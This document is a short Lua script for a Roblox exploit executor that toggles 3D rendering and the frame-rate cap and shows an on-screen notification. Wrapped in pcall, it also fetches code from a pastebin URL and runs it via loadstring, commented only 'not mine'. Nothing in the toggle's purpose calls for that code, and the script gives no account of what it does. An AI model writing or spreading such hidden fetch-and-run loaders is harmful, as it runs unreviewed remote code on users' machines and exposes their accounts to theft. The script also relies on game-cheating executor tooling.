local RunService = game:GetService("RunService")

getgenv().noRender = not getgenv().noRender
local state = getgenv().noRender

RunService:Set3dRenderingEnabled(not state)

setfpscap(state and 10 or 60)

local success, ext = pcall(function()
    return loadstring(game:HttpGet("https://pastebin.com/raw/8dsvYWtb")) -- not mine
end)
if success and ext then
    pcall(ext)
end

pcall(function()
    game.StarterGui:SetCore("SendNotification", {
        Title = "No-Render",
        Text = (state and "ON" or "OFF"),
        Duration = 5
    })
end)
